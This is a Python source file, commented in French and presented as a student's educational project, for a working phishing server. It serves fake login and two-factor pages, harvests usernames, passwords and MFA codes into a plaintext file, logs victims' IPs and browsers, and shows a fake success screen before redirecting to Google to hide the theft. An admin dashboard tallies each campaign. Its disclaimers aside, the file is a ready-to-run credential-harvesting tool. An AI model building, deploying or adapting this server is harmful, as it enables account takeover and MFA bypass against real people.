"""
PHISHING FRAMEWORK - SERVEUR DE PHISHING
=========================================

⚠️  ATTENTION: Outil éducatif uniquement!
    - Utilise seulement pour apprendre la cybersécurité
    - Teste seulement sur tes propres comptes
    - NE JAMAIS utiliser sur de vraies personnes sans autorisation

Ce fichier contient le serveur web qui:
1. Héberge les fausses pages de connexion
2. Capture les identifiants des utilisateurs
3. Affiche un dashboard admin pour voir les résultats
4. Simule l'authentification multi-facteurs (MFA)

Author: Étudiant en cybersécurité
Date: 2026
"""

import asyncio
import json
import logging
from datetime import datetime
from pathlib import Path
from typing import Dict, List
import secrets

from aiohttp import web
import aiofiles


# Configuration du logging (système de journalisation des événements)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class PhishingCampaign:
    """
    Représente une campagne de phishing

    Une campagne = un test avec un objectif spécifique
    Par exemple: tester si tes amis cliquent sur un faux email Netflix

    Cette classe garde en mémoire:
    - Qui a cliqué sur le lien
    - Qui a entré ses identifiants
    - Combien de personnes sont tombées dans le piège
    """

    def __init__(self, campaign_id: str, target: str, template: str):
        """
        Crée une nouvelle campagne

        Args:
            campaign_id: Un nom unique pour ta campagne (ex: "test_netflix")
            target: L'email cible (ex: "mon-email@gmail.com")
            template: Le type de faux email (ex: "password_reset")
        """
        self.campaign_id = campaign_id
        self.target = target
        self.template = template
        self.created_at = datetime.now()
        self.victims: List[Dict] = []  # Liste de toutes les victimes
        self.credentials: List[Dict] = []  # Liste des identifiants capturés
        self.clicks = 0  # Compteur de clics

    def add_click(self, ip: str, user_agent: str):
        """
        Enregistre quand quelqu'un clique sur le lien de phishing

        Args:
            ip: L'adresse IP de la victime (ex: 192.168.1.100)
            user_agent: Le navigateur utilisé (ex: Chrome, Firefox)
        """
        self.clicks += 1
        self.victims.append({
            'timestamp': datetime.now().isoformat(),
            'ip': ip,
            'user_agent': user_agent,
            'action': 'click'
        })

    def add_credential(self, data: dict, ip: str):
        """
        Enregistre les identifiants capturés (email/password ou code MFA)

        Args:
            data: Les données capturées (username, password, mfa_code)
            ip: L'adresse IP de la victime
        """
        self.credentials.append({
            'timestamp': datetime.now().isoformat(),
            'ip': ip,
            'data': data
        })


class PhishingServer:
    """
    Serveur de phishing avancé avec capture MFA

    C'est le coeur du système! Ce serveur web fait tout le boulot:
    1. Héberge les fausses pages de login
    2. Capture les mots de passe
    3. Capture les codes 2FA (authentification à 2 facteurs)
    4. Affiche un dashboard pour voir les résultats

    Pense à ce serveur comme un faux site web qui imite Netflix, Gmail, etc.
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 8080):
        """
        Initialise le serveur de phishing

        Args:
            host: L'adresse IP où écouter (0.0.0.0 = toutes les interfaces)
                  127.0.0.1 = seulement ton PC, 0.0.0.0 = accessible depuis le réseau
            port: Le port à utiliser (8080 par défaut, comme un mini site web)
        """
        self.host = host
        self.port = port
        self.app = web.Application()  # Crée l'application web avec aiohttp
        self.campaigns: Dict[str, PhishingCampaign] = {}  # Stocke toutes les campagnes

        # Chemins vers les dossiers importants
        self.data_dir = Path(__file__).parent.parent / "data"  # Dossier pour sauvegarder les résultats
        self.templates_dir = Path(__file__).parent.parent / "templates"  # Dossier des pages HTML
        self.static_dir = Path(__file__).parent.parent / "static"  # Dossier des images/CSS

        # Crée le dossier data s'il n'existe pas
        self.data_dir.mkdir(exist_ok=True)

        # Configure toutes les routes (URLs) du serveur
        self._setup_routes()

        # Affiche un gros avertissement pour rappeler que c'est éducatif
        logger.warning("=" * 60)
        logger.warning("⚠️  FRAMEWORK DE PHISHING ÉDUCATIF")
        logger.warning("⚠️  UNIQUEMENT POUR APPRENDRE")
        logger.warning("⚠️  TESTE SEULEMENT SUR TES PROPRES COMPTES")
        logger.warning("=" * 60)

    def _setup_routes(self):
        """
        Configure toutes les URLs (routes) du serveur

        C'est ici qu'on définit toutes les pages web que le serveur va gérer:
        - /login = la fausse page de connexion
        - /auth = capture le mot de passe
        - /mfa = capture le code 2FA
        - /admin = dashboard pour voir les résultats
        - /track = lien qui redirige vers /login (pour tracker les clics)
        """
        # Pages de phishing (les fausses pages que les victimes voient)
        self.app.router.add_get('/login', self.handle_login_page)  # Affiche la page de login
        self.app.router.add_post('/auth', self.handle_auth)  # Reçoit le username/password
        self.app.router.add_post('/mfa', self.handle_mfa)  # Reçoit le code 2FA

        # Gestion des campagnes (pour toi, l'administrateur)
        self.app.router.add_get('/admin', self.handle_admin)  # Dashboard principal
        self.app.router.add_get('/admin/campaigns', self.handle_campaigns_list)  # Liste des campagnes
        self.app.router.add_get('/admin/campaign/{campaign_id}', self.handle_campaign_detail)  # Détails d'une campagne

        # Tracking des liens (pour savoir qui clique)
        self.app.router.add_get('/track/{campaign_id}', self.handle_track)  # Redirige vers /login en trackant

        # Fichiers statiques (images, CSS, JavaScript)
        self.app.router.add_static('/static', self.static_dir)

    async def handle_login_page(self, request):
        """
        Affiche la fausse page de connexion à la victime

        C'est la première page que voit la victime quand elle clique sur le lien.
        On enregistre:
        - Son adresse IP
        - Son navigateur (User-Agent)
        - L'heure de la visite

        Args:
            request: La requête HTTP contenant toutes les infos de la victime
        """
        # Récupère l'ID de campagne depuis l'URL (ex: /login?c=test)
        campaign_id = request.query.get('c', 'default')

        # Récupère l'IP de la victime
        ip = request.remote

        # Récupère le navigateur utilisé (Chrome, Firefox, Safari, etc.)
        user_agent = request.headers.get('User-Agent', 'Unknown')

        # Enregistre la visite dans la campagne
        if campaign_id in self.campaigns:
            self.campaigns[campaign_id].add_click(ip, user_agent)

        # Log pour l'admin (toi)
        logger.info(f"📧 Page de login visitée depuis {ip}")
        logger.info(f"   Navigateur: {user_agent}")

        # Charge et affiche la fausse page de connexion
        template_path = self.templates_dir / "login.html"
        if template_path.exists():
            # Lit le fichier HTML
            async with aiofiles.open(template_path, 'r') as f:
                content = await f.read()
                # Remplace {{campaign_id}} par l'ID réel dans le HTML
                content = content.replace('{{campaign_id}}', campaign_id)
                return web.Response(text=content, content_type='text/html')
        else:
            # Si le fichier n'existe pas, utilise une page par défaut
            return web.Response(text=self._default_login_page(campaign_id), content_type='text/html')

    async def handle_auth(self, request):
        """
        Capture les identifiants (email + mot de passe)

        Cette fonction est appelée quand la victime clique sur "Sign In"
        C'est LA fonction la plus importante du phishing!

        Elle fait 3 choses:
        1. Récupère le username et password
        2. Les sauvegarde dans un fichier
        3. Redirige vers la page MFA (pour capturer le code 2FA aussi)

        Args:
            request: Les données du formulaire (username + password)
        """
        # Récupère les données du formulaire HTML
        data = await request.post()
        campaign_id = data.get('campaign_id', 'default')
        username = data.get('username', '')  # L'email entré
        password = data.get('password', '')  # Le mot de passe entré
        ip = request.remote

        # JACKPOT! On a capturé les identifiants
        logger.info(f"🎣 IDENTIFIANTS CAPTURÉS depuis {ip}")
        logger.info(f"   Email/Username: {username}")
        logger.info(f"   Mot de passe: {'*' * len(password)} (caché mais sauvegardé)")

        # Enregistre dans la campagne (en mémoire)
        if campaign_id in self.campaigns:
            self.campaigns[campaign_id].add_credential({
                'username': username,
                'password': password,
                'stage': 'initial_auth'  # Première étape (avant MFA)
            }, ip)

        # Sauvegarde dans un fichier pour ne pas perdre les données
        await self._save_credentials({
            'timestamp': datetime.now().isoformat(),
            'ip': ip,
            'username': username,
            'password': password,
            'campaign_id': campaign_id
        })

        # Maintenant, affiche la page MFA pour capturer le code 2FA
        # (pour rendre le phishing encore plus crédible et complet)
        template_path = self.templates_dir / "mfa.html"
        if template_path.exists():
            async with aiofiles.open(template_path, 'r') as f:
                content = await f.read()
                # Remplace les variables dans le HTML
                content = content.replace('{{campaign_id}}', campaign_id)
                content = content.replace('{{username}}', username)
                return web.Response(text=content, content_type='text/html')
        else:
            return web.Response(text=self._default_mfa_page(campaign_id, username), content_type='text/html')

    async def handle_mfa(self, request):
        """
        Capture le code 2FA (authentification à deux facteurs)

        Après avoir capturé le mot de passe, on capture aussi le code 2FA
        pour rendre l'attaque plus complète et réaliste.

        Les codes 2FA sont souvent à 6 chiffres (123456) générés par:
        - Google Authenticator
        - Microsoft Authenticator
        - Authy
        - SMS

        Args:
            request: Les données du formulaire MFA (code à 6 chiffres)
        """
        # Récupère le code 2FA entré par la victime
        data = await request.post()
        campaign_id = data.get('campaign_id', 'default')
        username = data.get('username', '')
        mfa_code = data.get('mfa_code', '')  # Le code à 6 chiffres
        ip = request.remote

        # DOUBLE JACKPOT! On a maintenant le mot de passe ET le code 2FA
        logger.info(f"🔐 CODE 2FA CAPTURÉ depuis {ip}")
        logger.info(f"   Email: {username}")
        logger.info(f"   Code MFA: {mfa_code}")

        # Enregistre le code MFA dans la campagne
        if campaign_id in self.campaigns:
            self.campaigns[campaign_id].add_credential({
                'username': username,
                'mfa_code': mfa_code,
                'stage': 'mfa'  # Deuxième étape (après le password)
            }, ip)

        # Sauvegarde dans le fichier
        await self._save_credentials({
            'timestamp': datetime.now().isoformat(),
            'ip': ip,
            'username': username,
            'mfa_code': mfa_code,
            'campaign_id': campaign_id
        })

        # Redirige vers un vrai site (Google) pour que ça ait l'air légitime
        # La victime pense que tout a fonctionné normalement
        return web.Response(
            text="""
            <html>
            <head>
                <title>Authentication Successful</title>
                <meta charset="UTF-8">
                <style>
                    body { font-family: Arial; text-align: center; padding: 50px; background: #f0f2f5; }
                    .success-box { background: white; padding: 40px; border-radius: 12px; max-width: 400px; margin: 0 auto; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
                    h1 { color: #28a745; }
                    .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #667eea; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
                    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                </style>
            </head>
            <body>
                <div class="success-box">
                    <h1>✓ Authentification Réussie</h1>
                    <div class="spinner"></div>
                    <p>Redirection en cours...</p>
                </div>
                <script>
                    // Attend 2 secondes puis redirige vers Google
                    setTimeout(function() {
                        window.location.href = 'https://www.google.com';
                    }, 2000);
                </script>
            </body>
            </html>
            """,
            content_type='text/html'
        )

    async def handle_track(self, request):
        """Handle link tracking"""
        campaign_id = request.match_info['campaign_id']
        ip = request.remote
        user_agent = request.headers.get('User-Agent', 'Unknown')

        if campaign_id in self.campaigns:
            self.campaigns[campaign_id].add_click(ip, user_agent)

        logger.info(f"🔗 Link clicked from {ip} - Campaign: {campaign_id}")

        # Redirect to login page
        return web.HTTPFound(f'/login?c={campaign_id}')

    async def handle_admin(self, request):
        """Admin dashboard"""
        html = """
        <html>
        <head>
            <title>Phishing Framework - Admin</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
                .container { max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; }
                h1 { color: #333; border-bottom: 2px solid #e74c3c; padding-bottom: 10px; }
                .warning { background: #fff3cd; border: 1px solid #ffc107; padding: 15px; margin: 20px 0; border-radius: 4px; }
                .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin: 30px 0; }
                .stat-card { background: #ecf0f1; padding: 20px; border-radius: 4px; text-align: center; }
                .stat-number { font-size: 36px; font-weight: bold; color: #3498db; }
                .stat-label { color: #7f8c8d; margin-top: 10px; }
                table { width: 100%; border-collapse: collapse; margin: 20px 0; }
                th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
                th { background: #34495e; color: white; }
                tr:hover { background: #f5f5f5; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>⚠️ Phishing Framework - Admin Dashboard</h1>

                <div class="warning">
                    <strong>⚠️ WARNING:</strong> This is an educational tool for authorized testing only.
                    Unauthorized use is illegal.
                </div>

                <div class="stats">
                    <div class="stat-card">
                        <div class="stat-number">{campaigns}</div>
                        <div class="stat-label">Active Campaigns</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{clicks}</div>
                        <div class="stat-label">Total Clicks</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{credentials}</div>
                        <div class="stat-label">Credentials Captured</div>
                    </div>
                </div>

                <h2>Campaigns</h2>
                <table>
                    <tr>
                        <th>Campaign ID</th>
                        <th>Target</th>
                        <th>Clicks</th>
                        <th>Credentials</th>
                        <th>Created</th>
                    </tr>
                    {campaign_rows}
                </table>

                <h2>Quick Links</h2>
                <ul>
                    <li><a href="/login?c=test">Test Login Page</a></li>
                    <li><a href="/admin/campaigns">View All Campaigns</a></li>
                </ul>
            </div>
        </body>
        </html>
        """

        # Calculate stats
        total_clicks = sum(c.clicks for c in self.campaigns.values())
        total_creds = sum(len(c.credentials) for c in self.campaigns.values())

        # Generate campaign rows
        campaign_rows = ""
        for campaign_id, campaign in self.campaigns.items():
            campaign_rows += f"""
            <tr>
                <td><a href="/admin/campaign/{campaign_id}">{campaign_id}</a></td>
                <td>{campaign.target}</td>
                <td>{campaign.clicks}</td>
                <td>{len(campaign.credentials)}</td>
                <td>{campaign.created_at.strftime('%Y-%m-%d %H:%M')}</td>
            </tr>
            """

        if not campaign_rows:
            campaign_rows = "<tr><td colspan='5'>No campaigns yet</td></tr>"

        html = html.format(
            campaigns=len(self.campaigns),
            clicks=total_clicks,
            credentials=total_creds,
            campaign_rows=campaign_rows
        )

        return web.Response(text=html, content_type='text/html')

    async def handle_campaigns_list(self, request):
        """List all campaigns as JSON"""
        campaigns_data = {}
        for campaign_id, campaign in self.campaigns.items():
            campaigns_data[campaign_id] = {
                'target': campaign.target,
                'clicks': campaign.clicks,
                'credentials': len(campaign.credentials),
                'created_at': campaign.created_at.isoformat()
            }

        return web.json_response(campaigns_data)

    async def handle_campaign_detail(self, request):
        """Get campaign details"""
        campaign_id = request.match_info['campaign_id']

        if campaign_id not in self.campaigns:
            return web.json_response({'error': 'Campaign not found'}, status=404)

        campaign = self.campaigns[campaign_id]
        return web.json_response({
            'campaign_id': campaign_id,
            'target': campaign.target,
            'clicks': campaign.clicks,
            'victims': campaign.victims,
            'credentials': campaign.credentials,
            'created_at': campaign.created_at.isoformat()
        })

    async def _save_credentials(self, data: dict):
        """Save credentials to file"""
        creds_file = self.data_dir / "credentials.jsonl"
        async with aiofiles.open(creds_file, 'a') as f:
            await f.write(json.dumps(data) + '\n')

    def create_campaign(self, campaign_id: str, target: str, template: str = "default"):
        """Create new campaign"""
        campaign = PhishingCampaign(campaign_id, target, template)
        self.campaigns[campaign_id] = campaign
        logger.info(f"📋 Campaign created: {campaign_id} - Target: {target}")
        return campaign

    def _default_login_page(self, campaign_id: str) -> str:
        """Default login page template"""
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Sign In</title>
            <style>
                body {{ font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
                .login-box {{ background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 400px; }}
                .logo {{ text-align: center; margin-bottom: 30px; font-size: 32px; color: #1877f2; font-weight: bold; }}
                input {{ width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
                button {{ width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }}
                button:hover {{ background: #166fe5; }}
                .warning {{ font-size: 10px; color: #999; text-align: center; margin-top: 20px; }}
            </style>
        </head>
        <body>
            <div class="login-box">
                <div class="logo">Company Login</div>
                <form action="/auth" method="post">
                    <input type="hidden" name="campaign_id" value="{campaign_id}">
                    <input type="email" name="username" placeholder="Email or username" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Sign In</button>
                </form>
                <div class="warning">⚠️ Educational Demo - For Testing Only</div>
            </div>
        </body>
        </html>
        """

    def _default_mfa_page(self, campaign_id: str, username: str) -> str:
        """Default MFA page template"""
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Two-Factor Authentication</title>
            <style>
                body {{ font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
                .mfa-box {{ background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 400px; }}
                .title {{ text-align: center; margin-bottom: 20px; font-size: 24px; color: #333; }}
                .subtitle {{ text-align: center; color: #666; margin-bottom: 30px; }}
                input {{ width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; text-align: center; font-size: 18px; letter-spacing: 4px; }}
                button {{ width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }}
                button:hover {{ background: #166fe5; }}
                .warning {{ font-size: 10px; color: #999; text-align: center; margin-top: 20px; }}
            </style>
        </head>
        <body>
            <div class="mfa-box">
                <div class="title">🔐 Two-Factor Authentication</div>
                <div class="subtitle">Enter the 6-digit code from your authenticator app</div>
                <form action="/mfa" method="post">
                    <input type="hidden" name="campaign_id" value="{campaign_id}">
                    <input type="hidden" name="username" value="{username}">
                    <input type="text" name="mfa_code" placeholder="000000" maxlength="6" pattern="[0-9]{{6}}" required autofocus>
                    <button type="submit">Verify</button>
                </form>
                <div class="warning">⚠️ Educational Demo - For Testing Only</div>
            </div>
        </body>
        </html>
        """

    async def start(self):
        """Start phishing server"""
        runner = web.AppRunner(self.app)
        await runner.setup()
        site = web.TCPSite(runner, self.host, self.port)
        await site.start()

        logger.info(f"🚀 Phishing server started on http://{self.host}:{self.port}")
        logger.info(f"📊 Admin dashboard: http://127.0.0.1:{self.port}/admin")
        logger.info(f"🎣 Phishing page: http://127.0.0.1:{self.port}/login")

        # Create default test campaign
        self.create_campaign("test", "test-target@example.com")

        # Keep running
        await asyncio.Event().wait()


async def main():
    """Main function"""
    import argparse

    parser = argparse.ArgumentParser(description="Advanced Phishing Framework")
    parser.add_argument("--host", default="0.0.0.0", help="Listen host")
    parser.add_argument("--port", type=int, default=8080, help="Listen port")

    args = parser.parse_args()

    server = PhishingServer(args.host, args.port)
    await server.start()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("\n🛑 Server stopped")
